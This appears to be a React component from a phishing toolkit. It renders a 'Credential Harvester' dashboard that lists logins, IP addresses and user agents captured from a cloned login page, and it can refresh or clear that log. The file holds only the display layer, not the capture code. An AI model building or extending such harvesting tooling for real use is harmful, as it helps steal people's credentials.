
'use client';

import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Button } from '@/components/ui/button';
import { Trash2, ShieldAlert, RefreshCw } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { Badge } from './ui/badge';
import { ScrollArea } from './ui/scroll-area';

export type CapturedCredential = {
    timestamp: string; // ISO String
    ipAddress?: string;
    userAgent?: string;
    [key: string]: any; // Allows for arbitrary keys from form fields
};

type CredentialHarvesterProps = {
    credentials: CapturedCredential[];
    onClear: () => void;
    onRefresh: () => void;
};

export function CredentialHarvester({ credentials, onClear, onRefresh }: CredentialHarvesterProps) {
    const { toast } = useToast();

    const handleClear = () => {
        onClear();
        toast({
            title: 'Log Cleared',
            description: 'The credential log has been wiped.',
        });
    }

    // Dynamically get all headers except for the timestamp
    const headers = credentials.length > 0
        ? ['timestamp', ...Object.keys(credentials[0]).filter(key => key !== 'timestamp')]
        : ['timestamp'];

    return (
        <Card className="flex flex-col h-full">
            <CardHeader>
                 <div className="flex justify-between items-start">
                  <div className="flex items-center gap-3">
                      <ShieldAlert className="h-6 w-6 text-destructive" />
                      <CardTitle>Credential Harvester</CardTitle>
                  </div>
                  {credentials.length > 0 && <Badge variant="destructive">{credentials.length} Captured</Badge>}
                </div>
                <CardDescription>
                    Credentials captured from the cloned login page are displayed here in real-time.
                </CardDescription>
            </CardHeader>
            <CardContent className="flex-grow">
                 <ScrollArea className="h-72 w-full">
                    <Table>
                        <TableHeader>
                            <TableRow>
                                {headers.map(header => (
                                    <TableHead key={header} className="capitalize">{header.replace(/([A-Z])/g, ' $1')}</TableHead>
                                ))}
                            </TableRow>
                        </TableHeader>
                        <TableBody>
                             {credentials.length === 0 ? (
                                <TableRow>
                                    <TableCell colSpan={headers.length} className="h-24 text-center">
                                         No credentials captured yet.
                                    </TableCell>
                                </TableRow>
                            ) : (
                                credentials.slice().reverse().map((cred, index) => (
                                    <TableRow key={cred.timestamp + index}>
                                       {headers.map(header => (
                                           <TableCell key={header} className="font-mono text-xs max-w-[200px] truncate">
                                                {header === 'timestamp' 
                                                    ? new Date(cred[header]).toLocaleString() 
                                                    : String(cred[header] ?? '')
                                                }
                                           </TableCell>
                                       ))}
                                    </TableRow>
                                ))
                            )}
                        </TableBody>
                    </Table>
                </ScrollArea>
            </CardContent>
            <CardFooter className="border-t pt-6 justify-between">
                <Button variant="outline" onClick={onRefresh}>
                    <RefreshCw className="mr-2 h-4 w-4" />
                    Refresh Log
                </Button>
                <Button variant="destructive" onClick={handleClear} disabled={credentials.length === 0}>
                    <Trash2 className="mr-2 h-4 w-4" />
                    Clear Log
                </Button>
            </CardFooter>
        </Card>
    );
}
